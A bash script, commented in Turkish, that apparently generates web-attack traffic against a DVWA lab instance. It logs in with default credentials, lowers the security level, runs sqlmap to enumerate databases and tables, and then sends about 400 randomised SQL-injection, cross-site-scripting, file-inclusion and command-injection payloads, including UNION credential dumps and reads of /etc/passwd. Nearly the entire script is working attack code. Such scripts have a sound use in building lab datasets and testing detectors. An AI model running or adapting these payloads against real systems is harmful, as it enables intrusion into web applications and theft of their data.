#!/usr/bin/env bash
# 03 web_attack — DVWA: sqlmap (SQLi derin) + ~400 çeşitli web saldırı isteği.
# Sıra: DB oluştur → login → güvenlik low → sqlmap → payload döngüsü.
set -uo pipefail
VIC="${1:-10.10.10.30}"
N="${2:-400}"                 # payload isteği sayısı (≈ akış)
BASE="http://$VIC"
CJ="$(mktemp)"
RE='name=.user_token.[^>]*value=.\K[0-9a-f]+'
tok(){ curl -s -b "$CJ" "$1" | grep -oP "$RE" | head -1; }

echo "[web] DVWA oturumu hazırlanıyor ($BASE)"
ST=$(curl -s -c "$CJ" "$BASE/setup.php" | grep -oP "$RE" | head -1)
curl -s -b "$CJ" -c "$CJ" --data "create_db=Create+%2F+Reset+Database&user_token=$ST" "$BASE/setup.php" -o /dev/null || true
sleep 1
T=$(tok "$BASE/login.php")
curl -s -L -b "$CJ" -c "$CJ" --data "username=admin&password=password&user_token=$T&Login=Login" "$BASE/login.php" -o /dev/null
SC=$(tok "$BASE/security.php")
curl -s -b "$CJ" -c "$CJ" --data "security=low&seclev_submit=Submit&user_token=$SC" "$BASE/security.php" -o /dev/null || true
SID=$(grep -aoP 'PHPSESSID\s+\K\S+' "$CJ" | tail -1)
echo "[web] PHPSESSID=${SID:-<yok>}  index=$(curl -s -o /dev/null -w '%{http_code}' -b "$CJ" "$BASE/index.php")"
COOK="PHPSESSID=${SID}; security=low"

echo "[web] sqlmap (SQLi + blind, derin)"
sqlmap -u "$BASE/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$COOK" \
  --batch --level=3 --risk=2 --dbs --tables --threads=4 --flush-session || true
sqlmap -u "$BASE/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="$COOK" \
  --batch --level=2 --risk=2 --technique=B --threads=4 --flush-session || true

echo "[web] $N çeşitli payload isteği (SQLi/XSS/LFI/cmdi)"
sqli=( "1' OR '1'='1" "1' UNION SELECT user,password FROM users-- -" "1'; DROP TABLE x-- -" "1' AND SLEEP(0)-- -" "1 OR 1=1" )
xss=( "<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg/onload=alert(1)>" "'\"><script>alert(document.cookie)</script>" )
lfi=( "../../../../etc/passwd" "....//....//etc/passwd" "/etc/passwd%00" "php://filter/convert.base64-encode/resource=index.php" )
cmd=( "127.0.0.1;id" "127.0.0.1|whoami" "127.0.0.1&&cat /etc/passwd" "|uname -a" )
enc(){ curl -Gs -b "$CJ" -o /dev/null --data-urlencode "$2" "$BASE/$1"; }
for i in $(seq 1 "$N"); do
  case $((RANDOM % 5)) in
    0) curl -Gs -b "$CJ" -o /dev/null --data-urlencode "id=${sqli[$RANDOM % ${#sqli[@]}]}" --data-urlencode "Submit=Submit" "$BASE/vulnerabilities/sqli/" ;;
    1) curl -Gs -b "$CJ" -o /dev/null --data-urlencode "name=${xss[$RANDOM % ${#xss[@]}]}" "$BASE/vulnerabilities/xss_r/" ;;
    2) curl -s  -b "$CJ" -o /dev/null "$BASE/vulnerabilities/fi/?page=${lfi[$RANDOM % ${#lfi[@]}]}" ;;
    3) curl -s  -b "$CJ" -o /dev/null --data "ip=${cmd[$RANDOM % ${#cmd[@]}]}&Submit=Submit" "$BASE/vulnerabilities/exec/" ;;
    4) curl -Gs -b "$CJ" -o /dev/null --data-urlencode "id=${sqli[$RANDOM % ${#sqli[@]}]}" --data-urlencode "Submit=Submit" "$BASE/vulnerabilities/sqli_blind/" ;;
  esac
done
rm -f "$CJ"
echo "[web] done"
